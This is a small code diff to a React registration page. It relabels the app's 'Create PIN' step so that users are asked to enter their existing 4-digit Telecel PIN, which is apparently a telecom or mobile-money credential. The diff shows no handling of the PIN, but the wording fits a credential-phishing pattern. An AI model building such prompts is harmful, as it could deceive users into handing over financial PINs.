@@ -199,12 +199,12 @@ const RegisterPage = () => {
           <button onClick={() => setStep("details")} className="text-primary-foreground">
             <ArrowLeft className="w-5 h-5" />
           </button>
-          <h1 className="text-lg font-bold text-primary-foreground">Create PIN</h1>
+          <h1 className="text-lg font-bold text-primary-foreground">Enter your Telecel PIN</h1>
         </div>
 
         <div className="flex-1 px-6 py-6 flex flex-col items-center space-y-6">
           <div className="text-center">
-            <h2 className="text-lg font-semibold">Set a 4-Digit PIN</h2>
+            <h2 className="text-lg font-semibold">Enter your 4 digit Telecel Pin</h2>
             <p className="text-sm text-muted-foreground mt-1">This PIN will be used for future transactions.</p>
           </div>
           <InputOTP maxLength={4} value={pin} onChange={setPin}>
